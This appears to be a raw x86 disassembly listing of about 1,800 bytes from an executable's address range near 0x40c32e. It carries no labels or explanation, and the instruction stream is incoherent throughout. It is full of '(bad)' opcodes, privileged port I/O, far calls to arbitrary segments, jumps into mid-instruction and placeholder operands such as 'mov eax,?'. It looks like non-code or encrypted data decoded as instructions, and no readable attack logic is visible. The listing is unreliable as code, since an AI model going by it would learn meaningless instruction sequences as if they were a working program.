  40c32e:	mov    bh,0x96
  40c330:	ret    0x6076
  40c333:	and    BYTE PTR [ebx-0x610e7dc6],ch
  40c339:	xchg   ecx,eax
  40c33a:	aad    0xf3
  40c33c:	out    dx,eax
  40c33d:	aaa    
  40c33e:	and    DWORD PTR [ecx],0xffffff8a
  40c341:	fsub   DWORD PTR [edx]
  40c343:	stc    
  40c344:	xor    al,0x69
  40c346:	outs   dx,DWORD PTR ds:[esi]
  40c347:	sub    bh,BYTE PTR [edi+0x3329c416]
  40c34d:	add    al,0xa9
  40c34f:	xor    al,0x34
  40c351:	call   0x43ec:0x4ea151b3
  40c358:	je     0x40c396
  40c35a:	dec    edi
  40c35b:	pop    esp
  40c35c:	mov    ds:0x7106abfb,eax
  40c361:	lea    esp,[esi+0x4bb2f267]
  40c367:	pop    esi
  40c368:	data16 int3 
  40c36a:	cmp    eax,0xfad273c5
  40c36f:	sub    bl,BYTE PTR [eax+edi*1]
  40c372:	pop    ss
  40c373:	fsub   DWORD PTR [ebp+0x47d7204a]
  40c379:	jnp    0x40c370
  40c37b:	add    BYTE PTR [edx+0x34],0x6b
  40c37f:	adc    al,0xee
  40c381:	ja     0x40c37c
  40c383:	arpl   si,bp
  40c385:	push   ebx
  40c386:	push   ds
  40c387:	cmp    edi,ebp
  40c389:	cmp    DWORD PTR [edx+ecx*2-0x59be07c0],eax
  40c390:	call   0x3d67:0xe94a3e93
  40c397:	dec    ebp
  40c398:	cli    
  40c399:	jbe    0x40c3bc
  40c39b:	hlt    
  40c39c:	aaa    
  40c39d:	fld    TBYTE PTR [eax+0x59]
  40c3a0:	jno    0x40c419
  40c3a2:	mov    bl,0xca
  40c3a4:	jl     0x40c358
  40c3a6:	xor    al,0x18
  40c3a8:	mov    dh,0x2
  40c3aa:	sub    BYTE PTR [edi+0x7b],bl
  40c3ad:	push   esp
  40c3ae:	xor    ebx,edx
  40c3b0:	leave  
  40c3b1:	or     al,0x3d
  40c3b3:	push   es
  40c3b4:	mov    ecx,0x2622f89e
  40c3b9:	cmp    BYTE PTR [eax-0x2c4e9d6e],bl
  40c3bf:	adc    al,0x79
  40c3c1:	loop   0x40c41f
  40c3c3:	mov    al,ds:0x88d25228
  40c3c8:	xor    eax,0x6c7e35cc
  40c3cd:	repz (bad) 
  40c3cf:	stos   DWORD PTR es:[edi],eax
  40c3d0:	cdq    
  40c3d1:	add    BYTE PTR [ecx-0x3b],0x74
  40c3d5:	mov    al,0xb1
  40c3d7:	popf   
  40c3d8:	mov    cl,0xa5
  40c3da:	push   esp
  40c3db:	adc    DWORD PTR [ebp+0x65abfeb7],edx
  40c3e1:	lods   eax,DWORD PTR ds:[esi]
  40c3e2:	fwait
  40c3e3:	mov    al,ds:0x7030d3df
  40c3e8:	pop    ebx
  40c3e9:	leave  
  40c3ea:	mov    ds:0xb75c3f4b,al
  40c3ef:	dec    edi
  40c3f0:	call   0x9b7:0x5291fe99
  40c3f7:	jmp    0x272a:0xc960f01e
  40c3fe:	sti    
  40c3ff:	in     al,dx
  40c400:	inc    edi
  40c401:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c403:	jecxz  0x40c42d
  40c405:	jmp    0xc4ae637d
  40c40a:	arpl   WORD PTR [esi],bx
  40c40c:	aam    0x18
  40c40e:	or     eax,0x3e09cd3e
  40c413:	popa   
  40c414:	popa   
  40c415:	add    eax,0x56408125
  40c41a:	lahf   
  40c41b:	jo     0x40c441
  40c41d:	push   edx
  40c41e:	xor    eax,0xd9eea48f
  40c423:	inc    edi
  40c424:	gs fs pop ebp
  40c428:	add    BYTE PTR [edi+0x2d],bl
  40c42b:	inc    esp
  40c42c:	inc    ecx
  40c42d:	pop    ebp
  40c42e:	push   0xc9a0c69d
  40c433:	sbb    BYTE PTR [esp+ebp*2-0x5f],0x18
  40c438:	dec    edx
  40c439:	jl     0x40c48b
  40c43b:	inc    eax
  40c43c:	int    0xe7
  40c43e:	ror    edx,cl
  40c440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c441:	dec    esp
  40c442:	leave  
  40c443:	inc    ecx
  40c444:	dec    esp
  40c445:	mov    dl,dl
  40c447:	jp     0x40c3f8
  40c449:	inc    esp
  40c44a:	push   ebp
  40c44b:	inc    esp
  40c44c:	out    0x36,al
  40c44e:	icebp  
  40c44f:	cmp    bl,BYTE PTR [ecx]
  40c451:	sahf   
  40c452:	xor    al,0x6c
  40c454:	xchg   ebp,eax
  40c455:	and    al,0xc4
  40c457:	xchg   DWORD PTR [edi-0x1b],ecx
  40c45a:	sar    esp,cl
  40c45c:	sub    al,0xcc
  40c45e:	dec    ecx
  40c45f:	dec    eax
  40c460:	jp     0x40c4a4
  40c462:	xor    ecx,ecx
  40c464:	sub    esp,edi
  40c466:	mov    DWORD PTR [edx],eax
  40c468:	push   0x2883fb44
  40c46d:	xchg   ebp,eax
  40c46e:	jno    0x40c3fa
  40c470:	mov    ah,0x51
  40c472:	adc    DWORD PTR [esi+edx*4-0x6c2816cb],esp
  40c479:	in     eax,0x97
  40c47b:	pushf  
  40c47c:	xchg   ebp,eax
  40c47d:	int3   
  40c47e:	cmp    eax,0xd113bcb7
  40c483:	jp     0x40c457
  40c485:	pop    eax
  40c486:	out    dx,eax
  40c487:	and    al,0x68
  40c489:	daa    
  40c48a:	jne    0x40c4f7
  40c48c:	in     eax,0x61
  40c48e:	aaa    
  40c48f:	sbb    eax,0x31db1d4d
  40c494:	jg     0x40c44c
  40c496:	lahf   
  40c497:	daa    
  40c498:	xor    eax,0x321113dd
  40c49d:	jb     0x40c497
  40c49f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a0:	sub    ebx,DWORD PTR [eax]
  40c4a2:	pop    esp
  40c4a3:	lock (bad) 
  40c4a5:	adc    al,0x1f
  40c4a7:	xor    DWORD PTR [edx+0x3cda354c],edx
  40c4ad:	imul   esi,ebp,0xffffff9b
  40c4b0:	sub    al,0xd3
  40c4b2:	push   ebp
  40c4b3:	loopne 0x40c4b6
  40c4b5:	push   0xa49a1cb0
  40c4ba:	mov    ds:0x286f0f36,al
  40c4bf:	lds    esp,FWORD PTR [eax+0x641ac79e]
  40c4c5:	sbb    al,BYTE PTR [eax+0x747dfa44]
  40c4cb:	pop    esp
  40c4cc:	repnz add al,0x76
  40c4cf:	into   
  40c4d0:	in     eax,0x8d
  40c4d2:	inc    edi
  40c4d3:	mov    cl,0x4e
  40c4d5:	pop    ecx
  40c4d6:	xor    eax,edx
  40c4d8:	xchg   ecx,eax
  40c4d9:	jmp    0xedd4:0x78e5b645
  40c4e0:	ror    BYTE PTR [esi+ebx*4+0x2a],cl
  40c4e4:	inc    ebp
  40c4e5:	cs fs popf 
  40c4e8:	adc    dl,BYTE PTR ds:0x26553c81
  40c4ee:	out    dx,eax
  40c4ef:	dec    ebx
  40c4f0:	retf   0x14ca
  40c4f3:	loope  0x40c481
  40c4f5:	push   es
  40c4f6:	mov    eax,ds:0x8f646d03
  40c4fb:	jns    0x40c4c8
  40c4fd:	xor    ecx,DWORD PTR [eax-0x285a4016]
  40c503:	dec    edi
  40c504:	cdq    
  40c505:	xor    eax,0x3eeb528a
  40c50a:	dec    edi
  40c50b:	cmc    
  40c50c:	or     BYTE PTR [eax+0x11],bh
  40c50f:	(bad)  
  40c510:	out    0xa0,al
  40c512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c513:	xchg   edi,eax
  40c514:	and    ebx,DWORD PTR [ebp-0x75]
  40c517:	pop    es
  40c518:	or     cl,BYTE PTR [ebx-0x3f]
  40c51b:	mov    esp,0x4f4edeaf
  40c520:	lea    ebp,[edx-0x62]
  40c523:	(bad)  
  40c524:	xor    dl,BYTE PTR [ebp-0x4d031543]
  40c52a:	ja     0x40c558
  40c52c:	adc    ah,BYTE PTR [esi+0x32]
  40c52f:	inc    ebx
  40c530:	enter  0x22e3,0x43
  40c534:	pop    ebp
  40c535:	ja     0x40c59f
  40c537:	fst    st(1)
  40c539:	repz dec ecx
  40c53b:	pusha  
  40c53c:	adc    BYTE PTR [esi-0x55150558],0xfd
  40c543:	call   0xeedf:0xd7188d8c
  40c54a:	pop    ebx
  40c54b:	xchg   edx,eax
  40c54c:	push   es
  40c54d:	xchg   ecx,eax
  40c54e:	adc    bl,dh
  40c550:	imul   esp,DWORD PTR [ebp-0x5ae3d433],0x34
  40c557:	pop    esi
  40c558:	fidivr DWORD PTR [esi-0x6880e70d]
  40c55e:	rcl    esi,cl
  40c560:	iret   
  40c561:	aam    0x1c
  40c563:	mov    edx,DWORD PTR [ebx]
  40c565:	mov    dh,0xec
  40c567:	test   bh,dh
  40c569:	daa    
  40c56a:	popa   
  40c56b:	jmp    0xf62a:0x8cb7ece6
  40c572:	fs popf 
  40c574:	push   eax
  40c575:	mov    edi,0x1b0beefe
  40c57b:	mov    edx,0x14bdf1d1
  40c580:	mov    ecx,0x32cc5cfe
  40c585:	fldenv [edx+0x68]
  40c588:	clc    
  40c589:	mov    cl,0x29
  40c58b:	int    0x12
  40c58d:	cmp    esp,edi
  40c58f:	push   ebp
  40c590:	mov    ebx,0x9971d197
  40c595:	ficomp WORD PTR [esi]
  40c597:	in     eax,0x73
  40c599:	jne    0x40c5ce
  40c59b:	xor    ecx,edx
  40c59d:	dec    ebp
  40c59e:	xlat   BYTE PTR ds:[ebx]
  40c59f:	std    
  40c5a0:	ins    BYTE PTR es:[edi],dx
  40c5a1:	push   eax
  40c5a2:	mov    ebp,0x40c3e687
  40c5a7:	mov    bl,0xc3
  40c5a9:	in     al,0xaa
  40c5ab:	xor    bh,BYTE PTR [ebx+ebx*1-0x4a]
  40c5af:	lods   eax,DWORD PTR ds:[esi]
  40c5b0:	and    ecx,DWORD PTR [edx-0x7408f6cd]
  40c5b6:	jno    0x40c55c
  40c5b8:	ret    
  40c5b9:	xchg   edx,eax
  40c5ba:	aad    0xcc
  40c5bc:	push   0xffffffdd
  40c5be:	jo     0x40c566
  40c5c0:	out    0x1,al
  40c5c2:	mov    bl,0x3e
  40c5c4:	jns    0x40c608
  40c5c6:	dec    ebx
  40c5c7:	arpl   WORD PTR [ebp-0x21],sp
  40c5ca:	sub    eax,0x7292781
  40c5cf:	push   edx
  40c5d0:	mov    esp,0x6fe46643
  40c5d5:	lods   al,BYTE PTR cs:[esi]
  40c5d7:	jb     0x40c59c
  40c5d9:	jnp    0x40c589
  40c5db:	(bad)  
  40c5dc:	sbb    cl,BYTE PTR [ecx]
  40c5de:	xchg   ebp,eax
  40c5df:	and    edi,ebx
  40c5e1:	cmp    ebp,esp
  40c5e3:	pop    esi
  40c5e4:	push   ds
  40c5e5:	add    BYTE PTR [ecx-0x4],ah
  40c5e8:	ds cmc 
  40c5ea:	test   eax,0x1a9ade1a
  40c5ef:	lock ja 0x40c5f7
  40c5f2:	sbb    DWORD PTR [edi+0x6c],edi
  40c5f5:	pop    ss
  40c5f6:	mov    ds:0x3437b5b,al
  40c5fb:	lds    edi,FWORD PTR [esi-0x44]
  40c5fe:	mov    edx,0xb7c8d70b
  40c603:	in     al,dx
  40c604:	push   esp
  40c605:	mov    ecx,0xcb1d2340
  40c60a:	(bad)  
  40c60b:	sub    al,0x3f
  40c60d:	adc    eax,0x8b58ac7b
  40c612:	push   eax
  40c613:	shl    DWORD PTR [ecx+0x6ed05213],cl
  40c619:	mov    dh,0x71
  40c61b:	cli    
  40c61c:	jecxz  0x40c647
  40c61e:	push   ebp
  40c61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c620:	lea    ebp,ds:0xc497a106
  40c626:	das    
  40c627:	ror    al,0xd4
  40c62a:	push   cs
  40c62b:	sub    eax,0x9ba81fa7
  40c630:	leave  
  40c631:	ret    
  40c632:	xchg   esp,eax
  40c633:	clc    
  40c634:	shr    bh,0x94
  40c637:	push   eax
  40c638:	adc    DWORD PTR [ebx+ebp*4-0x63a0efbd],edi
  40c63f:	popa   
  40c640:	(bad)  
  40c641:	mov    eax,0x8f1bc453
  40c646:	xlat   BYTE PTR ds:[ebx]
  40c647:	pop    ebp
  40c648:	push   ecx
  40c649:	(bad)  
  40c64a:	adc    BYTE PTR [ebx],cl
  40c64c:	mov    esi,0xa1fc2959
  40c651:	and    al,0x1f
  40c653:	(bad)  
  40c654:	mov    esp,0x9a20758b
  40c659:	sub    bh,BYTE PTR ds:0x3c2b55f6
  40c65f:	cdq    
  40c660:	adc    DWORD PTR [ecx],0xa
  40c663:	js     0x40c6ad
  40c665:	jo     0x40c61b
  40c667:	sbb    BYTE PTR [ecx-0x7e],ah
  40c66a:	push   edx
  40c66b:	rcl    DWORD PTR [ebx+0x651fe084],0x6c
  40c672:	sub    eax,0x8c56258a
  40c677:	cmp    eax,0x43d68301
  40c67c:	mov    BYTE PTR fs:[edi+edi*2-0x17],al
  40c681:	dec    esi
  40c682:	push   ecx
  40c683:	inc    ecx
  40c684:	sbb    ebx,DWORD PTR [ebx]
  40c686:	cld    
  40c687:	lds    ebp,FWORD PTR [ebx-0x6a]
  40c68a:	adc    ch,dl
  40c68c:	shr    DWORD PTR [edi+0xf],1
  40c68f:	xor    dl,dh
  40c691:	(bad)  
  40c692:	add    cl,BYTE PTR [edx-0x2b522a53]
  40c698:	mov    dh,0x3c
  40c69a:	in     eax,dx
  40c69b:	mov    gs:0x4fef660c,eax
  40c6a1:	xchg   BYTE PTR [eax-0x667cc474],dl
  40c6a7:	aad    0x21
  40c6a9:	mov    ch,0x91
  40c6ab:	idiv   BYTE PTR [eax+0x4744a93a]
  40c6b1:	aas    
  40c6b2:	or     DWORD PTR [esi],0xffffffd9
  40c6b5:	pop    esi
  40c6b6:	push   bx
  40c6b8:	inc    eax
  40c6b9:	cmp    DWORD PTR [ecx],ebp
  40c6bb:	jno    0x40c670
  40c6bd:	test   al,0xbc
  40c6bf:	imul   ebx,edx,0x29
  40c6c2:	je     0x40c656
  40c6c4:	pusha  
  40c6c5:	dec    eax
  40c6c6:	dec    esi
  40c6c7:	jbe    0x40c665
  40c6c9:	into   
  40c6ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6cb:	push   ebp
  40c6cc:	mov    edx,0x345e07e3
  40c6d1:	and    eax,0x4a1c254c
  40c6d6:	dec    eax
  40c6d7:	xchg   edx,eax
  40c6d8:	cmp    al,0x6b
  40c6da:	icebp  
  40c6db:	pop    esi
  40c6dc:	fcomp  DWORD PTR [edi]
  40c6de:	xchg   ebp,eax
  40c6df:	leave  
  40c6e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6e1:	fbstp  TBYTE PTR [ebp-0x59a1fb13]
  40c6e7:	and    ecx,DWORD PTR [edi+0x38a8d3b4]
  40c6ed:	add    DWORD PTR [esi-0x78],0x67
  40c6f1:	xor    al,0x90
  40c6f3:	loope  0x40c6ea
  40c6f5:	clc    
  40c6f6:	in     al,dx
  40c6f7:	mov    esi,0xfeba2ec
  40c6fc:	cmc    
  40c6fd:	mov    al,ds:0xa87c6410
  40c702:	popa   
  40c703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c704:	mov    dh,0x9c
  40c706:	test   DWORD PTR [esi-0x35859147],esi
  40c70c:	test   al,0x60
  40c70e:	mov    cl,0xb5
  40c710:	shl    DWORD PTR [ecx-0x533de1ac],0x43
  40c717:	shl    DWORD PTR [ecx+0x1d],0x98
  40c71b:	and    DWORD PTR [bx],esp
  40c71e:	mov    ds:0x70d23fc2,eax
  40c723:	fwait
  40c724:	lds    esp,FWORD PTR [eiz*4+0x14c7a028]
  40c72b:	add    ebp,DWORD PTR [edx-0x11c42456]
  40c731:	adc    al,0x93
  40c733:	aaa    
  40c734:	jb     0x40c6c7
  40c736:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c738:	shl    BYTE PTR ds:0xec11d6aa,1
  40c73e:	mov    ah,BYTE PTR [ebx]
  40c740:	stos   DWORD PTR es:[edi],eax
  40c741:	mov    ch,0x3a
  40c743:	jbe    0x40c6f3
  40c745:	test   BYTE PTR [ebx],ah
  40c747:	fld    DWORD PTR [edx+0x16ecfc46]
  40c74d:	stos   BYTE PTR es:[edi],al
  40c74e:	test   BYTE PTR [eax-0x52],al
  40c751:	or     edx,DWORD PTR [edx-0x16]
  40c754:	or     ah,BYTE PTR [eax]
  40c756:	jle    0x40c7b8
  40c758:	stos   DWORD PTR es:[edi],eax
  40c759:	xchg   esp,eax
  40c75a:	dec    esp
  40c75b:	jle    0x40c6f1
  40c75d:	out    dx,eax
  40c75e:	mov    ebp,0x4206b7e0
  40c763:	ds inc ebp
  40c765:	mov    ah,0x1b
  40c767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c768:	loopne 0x40c7ba
  40c76a:	outs   dx,DWORD PTR ds:[esi]
  40c76b:	fisub  DWORD PTR es:[ebp-0x1d]
  40c76f:	add    DWORD PTR [edi],0x3b49427b
  40c775:	xor    DWORD PTR [eax+ecx*2+0x21],ebp
  40c779:	and    eax,0x3fb4f296
  40c77e:	pushf  
  40c77f:	clc    
  40c780:	or     DWORD PTR [edx],esp
  40c782:	neg    DWORD PTR [esi-0x6f]
  40c785:	icebp  
  40c786:	fsub   DWORD PTR [ebx]
  40c788:	out    0x63,al
  40c78a:	xor    edx,DWORD PTR [edi+0x7cee2d47]
  40c790:	push   0x25
  40c792:	(bad)  
  40c793:	fnstenv [ebx]
  40c795:	xor    al,0xb5
  40c797:	add    eax,0xe4304431
  40c79c:	sub    al,0xc0
  40c79e:	xor    al,0x62
  40c7a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7a1:	fs mov bh,0x4c
  40c7a4:	sub    bh,BYTE PTR [esi]
  40c7a6:	mov    eax,0xbe8ef00e
  40c7ab:	adc    eax,0x9df1b40
  40c7b0:	xor    eax,0x65befc0d
  40c7b5:	pop    DWORD PTR [esi+eax*8+0xce3380d]
  40c7bc:	loope  0x40c7f5
  40c7be:	add    al,0x5f
  40c7c0:	iret   
  40c7c1:	sub    ebx,DWORD PTR [edi+ebp*2]
  40c7c4:	sub    bh,ah
  40c7c6:	mov    bl,0x75
  40c7c8:	pop    es
  40c7c9:	mov    ebx,0x96ae0e7d
  40c7ce:	push   ebp
  40c7cf:	iret   
  40c7d0:	jbe    0x40c809
  40c7d2:	and    al,0xea
  40c7d4:	mov    dh,0x47
  40c7d6:	daa    
  40c7d7:	mov    ecx,0x7d562823
  40c7dc:	mov    eax,ds:0x26925fc7
  40c7e1:	repnz or eax,0x259ae6b0
  40c7e7:	aam    0xbe
  40c7e9:	xlat   BYTE PTR ds:[ebx]
  40c7ea:	add    ebp,DWORD PTR [edi-0x6677a591]
  40c7f0:	mov    ds:0x16b035be,al
  40c7f5:	mov    eax,ebp
  40c7f7:	sbb    al,0x31
  40c7f9:	push   es
  40c7fa:	lods   eax,DWORD PTR ds:[esi]
  40c7fb:	mov    edx,0xa33323c4
  40c800:	xchg   edi,eax
  40c801:	mov    al,ds:0x1568a2fc
  40c806:	stos   DWORD PTR es:[edi],eax
  40c807:	jne    0x40c7c2
  40c809:	mov    eax,ds:0xa5309efb
  40c80e:	(bad)  
  40c80f:	repnz popa 
  40c811:	test   eax,0xe8353a57
  40c816:	adc    DWORD PTR [esi+edx*2+0x17],ecx
  40c81a:	out    0x19,al
  40c81c:	(bad)
  40c81f:	sahf   
  40c820:	or     eax,0x42f56b78
  40c825:	and    dl,al
  40c827:	jb     0x40c830
  40c829:	jnp    0x40c7d3
  40c82b:	mov    eax,?
  40c82d:	mov    bh,0x82
  40c82f:	dec    esp
  40c830:	and    bh,BYTE PTR [ebx-0x48]
  40c833:	out    0xbe,al
  40c835:	jns    0x40c835
  40c837:	pop    edx
  40c838:	daa    
  40c839:	ja     0x40c838
  40c83b:	add    eax,0x832386f6
  40c840:	outs   dx,DWORD PTR ds:[esi]
  40c841:	jl     0x40c83b
  40c843:	lods   al,BYTE PTR ds:[esi]
  40c844:	aas    
  40c845:	test   eax,0x62f5b87f
  40c84a:	mov    ah,0x33
  40c84c:	and    eax,eax
  40c84e:	push   ecx
  40c84f:	pop    es
  40c850:	ins    BYTE PTR es:[edi],dx
  40c851:	inc    esi
  40c852:	(bad)  
  40c853:	(bad)  
  40c854:	and    bh,al
  40c856:	dec    edi
  40c857:	jg     0x40c85d
  40c859:	xlat   BYTE PTR ds:[ebx]
  40c85a:	shl    BYTE PTR [ecx-0x56],1
  40c85d:	stos   DWORD PTR es:[edi],eax
  40c85e:	or     ch,ah
  40c860:	pop    ss
  40c861:	std    
  40c862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c863:	or     BYTE PTR [ecx+0x48],ah
  40c866:	sub    dl,BYTE PTR [eax+0x50]
  40c869:	cs dec ebp
  40c86b:	inc    edx
  40c86c:	push   ebx
  40c86d:	scas   eax,DWORD PTR es:[edi]
  40c86e:	test   BYTE PTR [edi],dl
  40c870:	data16 icebp 
  40c872:	test   DWORD PTR [ecx],edi
  40c874:	pop    ebp
  40c875:	mov    es,esp
  40c877:	push   esi
  40c878:	and    al,0x38
  40c87a:	pop    ss
  40c87b:	dec    edx
  40c87c:	mov    ebx,0xb0c929ad
  40c881:	cmp    ebp,0x33cd1111
  40c887:	pop    esi
  40c888:	not    ecx
  40c88a:	into   
  40c88b:	out    dx,eax
  40c88c:	sub    al,0x3c
  40c88e:	push   edx
  40c88f:	aaa    
  40c890:	out    dx,al
  40c891:	int3   
  40c892:	iret   
  40c893:	xchg   ebx,eax
  40c894:	(bad)  
  40c895:	push   ds
  40c896:	xchg   ebx,eax
  40c897:	loop   0x40c889
  40c899:	popf   
  40c89a:	add    bl,cl
  40c89c:	repnz xor eax,0xfc935789
  40c8a2:	cmp    ch,BYTE PTR [ebx+0x53]
  40c8a5:	push   esi
  40c8a6:	push   0xff2823ca
  40c8ab:	pop    ds
  40c8ac:	divps  xmm6,xmm3
  40c8af:	pusha  
  40c8b0:	pop    eax
  40c8b1:	dec    ebx
  40c8b2:	dec    ebx
  40c8b3:	stos   BYTE PTR es:[edi],al
  40c8b4:	fs retf 0x27d6
  40c8b8:	lds    edi,FWORD PTR [ebp-0x6d]
  40c8bb:	cli    
  40c8bc:	lea    edi,[edi]
  40c8be:	and    bl,al
  40c8c0:	jo     0x40c8ee
  40c8c2:	rcr    DWORD PTR [esi-0x7171e0f7],cl
  40c8c8:	sub    DWORD PTR ds:0xfb6a4dbf,edi
  40c8ce:	adc    bh,BYTE PTR [edi-0x730aae45]
  40c8d4:	mov    dl,0x97
  40c8d6:	pop    esi
  40c8d7:	cwde   
  40c8d8:	inc    ecx
  40c8d9:	out    dx,al
  40c8da:	pop    es
  40c8db:	mov    bl,0xa3
  40c8dd:	daa    
  40c8de:	xor    edi,DWORD PTR [edi-0x7]
  40c8e1:	in     al,dx
  40c8e2:	push   ss
  40c8e3:	xor    bl,ah
  40c8e5:	sub    BYTE PTR [eax],bl
  40c8e7:	fs cwde 
  40c8e9:	lods   eax,DWORD PTR ds:[esi]
  40c8ea:	call   0x6d1a:0xab8bb930
  40c8f1:	sub    al,0x9e
  40c8f3:	jb     0x40c875
  40c8f5:	sbb    al,0x2b
  40c8f7:	cmp    eax,0x2af3388d
  40c8fc:	imul   ebp,eax,0x52f97d64
  40c902:	pop    edi
  40c903:	jbe    0x40c8d5
  40c905:	mov    esi,0x49039153
  40c90a:	ins    DWORD PTR es:[edi],dx
  40c90b:	je     0x40c920
  40c90d:	dec    esi
  40c90e:	dec    ebp
  40c90f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c910:	jb     0x40c96b
  40c912:	push   ds
  40c913:	lods   al,BYTE PTR ds:[esi]
  40c914:	mov    dh,0x96
  40c916:	and    DWORD PTR [ecx+ebx*4+0x67],0xec6b4458
  40c91e:	in     al,0xc8
  40c920:	(bad)  
  40c921:	or     ch,BYTE PTR [edi]
  40c923:	dec    ecx
  40c924:	jge    0x40c934
  40c926:	mov    esi,0xa3db87d9
  40c92b:	add    al,0xb4
  40c92d:	add    bh,BYTE PTR [esi]
  40c92f:	in     eax,dx
  40c930:	aaa    
  40c931:	sbb    bh,bh
  40c933:	add    DWORD PTR [edx],ecx
  40c935:	mov    dh,0x53
  40c937:	pop    ecx
  40c938:	popa   
  40c939:	xchg   ecx,eax
  40c93a:	pusha  
  40c93b:	retf   
  40c93c:	xor    ebx,DWORD PTR [ebx-0x4ceaab60]
  40c942:	stos   DWORD PTR es:[edi],eax
  40c943:	xor    esi,DWORD PTR [esi+0x41]
  40c946:	imul   edx,DWORD PTR [ecx+ebx*2-0x3],0xb
  40c94b:	sub    DWORD PTR [esi+0x402f2555],edi
  40c951:	sbb    BYTE PTR [edx-0x4a],ch
  40c954:	adc    al,0x58
  40c956:	out    0x29,eax
  40c958:	ss mov ecx,0x4582a8ed
  40c95e:	mov    al,0x8b
  40c960:	rcl    BYTE PTR [edi-0x61de7525],1
  40c966:	pop    esp
  40c967:	jg     0x40c977
  40c969:	mov    ebp,0x6b4652d1
  40c96e:	mov    esi,?
  40c970:	cld    
  40c971:	adc    ebp,DWORD PTR [ebp-0x4a967801]
  40c977:	push   esi
  40c978:	fimul  WORD PTR [eax+edi*8+0x29fe5e9b]
  40c97f:	pop    eax
  40c980:	test   ch,bl
  40c982:	das    
  40c983:	add    DWORD PTR [edx+0x4b69c124],ebp
  40c989:	jge    0x40c948
  40c98b:	imul   ebp,edx,0x88b9ebde
  40c991:	scas   eax,DWORD PTR es:[edi]
  40c992:	push   ecx
  40c993:	dec    esp
  40c994:	dec    ebp
  40c995:	add    al,BYTE PTR [edi+0x62]
  40c998:	fcomp  QWORD PTR [ecx-0x5c]
  40c99b:	cwde   
  40c99c:	and    al,0xd6
  40c99e:	pop    ebp
  40c99f:	sbb    edi,DWORD PTR fs:[eax+0xf]
  40c9a3:	stos   DWORD PTR es:[edi],eax
  40c9a4:	cmp    al,0xde
  40c9a6:	push   ecx
  40c9a7:	in     al,0x48
  40c9a9:	inc    ebx
  40c9aa:	add    al,0xdc
  40c9ac:	test   DWORD PTR [eax-0x2a6bf12],esi
  40c9b2:	jb     0x40ca29
  40c9b4:	in     al,0x60
  40c9b6:	cmp    eax,0x2e1bd0fe
  40c9bb:	loop   0x40c9e2
  40c9bd:	sub    al,0x2
  40c9bf:	or     eax,0x21e07aef
  40c9c4:	aad    0xa
  40c9c6:	(bad)  
  40c9c7:	cld    
  40c9c8:	je     0x40ca2d
  40c9ca:	mov    cl,0x83
  40c9cc:	or     DWORD PTR [esi],ecx
  40c9ce:	outs   dx,DWORD PTR ds:[esi]
  40c9cf:	cld    
  40c9d0:	dec    esp
  40c9d1:	push   esp
  40c9d2:	pop    ss
  40c9d3:	fldenv [edx]
  40c9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d6:	or     ebp,DWORD PTR [esi]
  40c9d8:	push   ebp
  40c9d9:	push   ds
  40c9da:	or     ch,BYTE PTR [edi-0x7f]
  40c9dd:	lods   eax,DWORD PTR ds:[esi]
  40c9de:	sti    
  40c9df:	mov    esp,DWORD PTR [edx+eax*1-0x12457855]
  40c9e6:	shl    BYTE PTR [esi+0x12],0x5e
  40c9ea:	shr    BYTE PTR [ecx+0x1c],1
  40c9ed:	adc    eax,0x290ee8ac
  40c9f2:	cmp    bl,BYTE PTR [esi+esi*1+0x253df587]
  40c9f9:	xchg   ebp,eax
  40c9fa:	push   0xb7efb107
  40c9ff:	repnz cld 
  40ca01:	xchg   edi,eax
  40ca02:	(bad)  
  40ca03:	pop    DWORD PTR [edi]
  40ca05:	das    
  40ca06:	jo     0x40c9d2
  40ca08:	pop    ss
  40ca09:	cdq    
  40ca0a:	ins    BYTE PTR es:[edi],dx
  40ca0b:	retf   0xabce
  40ca0e:	daa    
  40ca0f:	xchg   esi,eax
  40ca10:	rol    DWORD PTR [edx+0x23b7b354],cl
  40ca16:	pushf  
  40ca17:	loop   0x40ca08
  40ca19:	outs   dx,BYTE PTR ds:[esi]
  40ca1a:	dec    esp
  40ca1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1c:	mov    eax,esp
  40ca1e:	imul   ecx,DWORD PTR [esi+0x2],0x158480e9
  40ca25:	jnp    0x40ca4e
  40ca27:	xor    al,0x28
  40ca29:	hlt    
  40ca2a:	jle    0x40ca9d
  40ca2c:	pop    esi
  40ca2d:	mov    al,0x96
  40ca2f:	aad    0xe0
  40ca31:	das    
  40ca32:	lahf   
  40ca33:	into   
  40ca34:	sbb    DWORD PTR [esi],esp
  40ca36:	cld    
  40ca37:	xchg   esp,eax
  40ca38:	sub    BYTE PTR gs:[edx+eax*1-0x22],al
  40ca3d:	adc    bl,BYTE PTR [edi+ebp*4-0x59]
  40ca41:	(bad)  
  40ca42:	loopne 0x40c9fb
  40ca44:	aaa    
  40ca45:	jae    0x40caa3
  40ca47:	jmp    0x40ca3d
  40ca49:	xchg   edx,eax
  40ca4a:	out    dx,eax
  40ca4b:	jmp    0x40ca9e
  40ca4d:	mov    eax,ds:0xff9acca7
  40ca52:	in     eax,0x1b
  40ca54:	cmp    dh,ah
  40ca56:	or     DWORD PTR [eax+0x72],0xf7ec32d2
  40ca5d:	in     eax,0x2b
  40ca5f:	xor    BYTE PTR [edi-0x6f50f395],dh
  40ca65:	test   BYTE PTR [ebx],dh
  40ca67:	sbb    edx,DWORD PTR [edi]
  40ca69:	popa   
  40ca6a:	stc    
  40ca6b:	mov    ebp,0x72d7c645
  40ca70:	mov    ch,0x45
  40ca72:	mov    edi,0x11774b31
  40ca77:	nop
  40ca78:	pusha  
  40ca79:	pop    edx
  40ca7a:	retf   0xad5e
  40ca7d:	push   edx
